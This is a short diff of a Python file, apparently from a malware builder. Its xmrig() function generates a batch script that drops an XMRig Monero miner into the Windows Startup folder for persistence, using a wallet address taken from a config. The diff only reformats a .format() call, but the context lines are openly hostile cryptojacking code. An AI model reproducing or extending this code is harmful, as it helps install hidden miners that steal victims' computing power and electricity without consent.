@@ -6,6 +6,7 @@ from bin._random_string import get_random_string
 
 cc = Config()
 
+
 def xmrig():
     batch_code = """
 @echo off
@@ -35,7 +36,9 @@ del move_to_startup.bat
 cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
 call start_xmrig.bat %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
 exit
-""".format(cc.get_xmr_adress(), get_random_string(12))
+""".format(
+        cc.get_xmr_adress(), get_random_string(12)
+    )
 
     batch_filepath = os.path.join(os.environ["TEMP"], "batchscript.bat")
 
